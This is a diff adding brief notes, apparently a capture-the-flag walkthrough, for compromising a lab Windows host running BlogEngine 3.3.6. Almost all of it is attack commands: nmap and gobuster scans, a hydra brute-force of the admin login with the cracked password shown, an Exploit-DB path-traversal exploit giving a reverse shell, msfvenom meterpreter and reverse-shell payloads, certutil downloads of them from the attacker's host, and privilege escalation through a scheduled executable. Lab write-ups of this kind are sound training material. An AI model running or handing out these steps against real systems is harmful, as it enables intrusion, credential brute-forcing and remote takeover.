@@ -1,0 +1,23 @@
+nmap -sV -sC -Pn 10.10.63.174 > nmap.txt
+gobuster dir  -u http://10.10.63.174/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+1.nmap掃描出來用hydra暴力破解密碼
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.63.174 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=GdXpp9d595f6FIIANgCGZlCdjHQ%2FRLSnHN08Kk2R3PMVeQdf7vMFT3HQ9X%2B0rFtwCnDvpUG0ztd4%2BwFU9iqhMBDsFZ6kDoJC3uHcER2GJZw33kYbgMGavxGbZaVRnZ51WgxjFP9XvkQOBq4cBMhbNzqa1eaOQp81X%2Fvdfn4r%2Bc9lo9Nr&__EVENTVALIDATION=vpB21rkvr%2FdSFzG3gmNSb5mJqCCex2eCz4UrYTZAacAIqVwP64xxR9H%2BwwXln6N8kNa9Lrp02ncBIBT02FuKO7Iyrp2aebOPIjw59P%2FXoBsNJeduD0nG4mYV%2B5QO2Fgq87B73ssvP2COs89nfp%2BBKg8IN3ooI8xIiIceSgzGPcmF%2B9Vv&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -t 64
+[80][http-post-form] host: 10.10.63.174   login: admin   password: 1qaz2wsx
+2.根據blogenine3.3.6找到CVE
+https://www.exploit-db.com/exploits/46353
+3.上傳PostView.ascx
+4.訪問後取得reverse shell
+http://10.10.63.174/?theme=../../App_Data/files
+5.生成reverse.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.204 LPORT=4444 -f exe -o reverse.exe
+6.上傳reverse.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/reverse.exe reverse.exe
+7.查找到schduler服務路徑下的日誌,發現定時執行Message.exe
+C:\Program Files (x86)\SystemScheduler\Events\20198415519.INI_LOG.txt
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.204 LPORT=4445 -f exe -o reverseroot.exe
+
+8.生成stable的payload
+msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.204 LPORT=4444 -f exe -o reversestable.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/reversestable.exe reversestable.exe
